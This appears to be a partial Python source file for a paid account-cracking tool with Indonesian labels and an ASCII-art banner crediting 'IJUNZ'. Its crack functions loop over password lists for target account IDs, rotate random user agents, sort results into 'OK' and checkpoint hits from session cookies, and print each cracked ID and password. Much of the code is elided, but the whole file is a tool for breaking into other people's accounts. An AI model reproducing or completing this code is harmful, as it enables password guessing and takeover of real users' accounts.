...
\033[92;1m░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝'
\033[91;1m--------------------------------------------------
\033[97;1m>>     Owner    : IJUNZ
\033[97;1m>>     Version  : 1.0
\033[97;1m>>     Git hop  : Gk ada di hapus
\033[92;1m>>     Tol NOT FREE  : \x1b[91;1m PAID	''')
#ID ACTIVE
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ ➳Q᭄™QUTA ]  {P}{b}{loop}{P}•{b}{len(id)}{P}   OK:{P}{H}{ok}{P}   CP:{P}{M}{cp}{P}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{asu}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print( f'\r\x1b[1;91m [ ➳Q᭄™QUTA-CP ] {idf} | {pw}')     
				...
				if 'no' in taplikasi:
					...
					print(f'\r\x1b[1;92m [ ➳Q᭄™QUTA-OK ] {idf} | {pw}')
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ ➳Q᭄™QUTA ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
